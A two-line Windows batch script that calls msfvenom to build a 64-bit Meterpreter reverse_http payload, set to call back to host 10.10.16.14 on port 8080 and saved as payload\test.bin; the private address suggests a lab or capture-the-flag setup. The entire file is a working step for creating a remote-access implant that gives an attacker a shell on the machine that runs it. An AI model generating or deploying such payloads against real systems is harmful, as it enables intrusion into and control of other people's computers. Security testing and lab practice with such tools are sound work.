@echo off
C:\metasploit-framework\bin\msfvenom.bat -p windows/x64/meterpreter/reverse_http LHOST=10.10.16.14 LPORT=8080 EXITFUNC=thread -o payload\test.bin --arch x64 --platform windows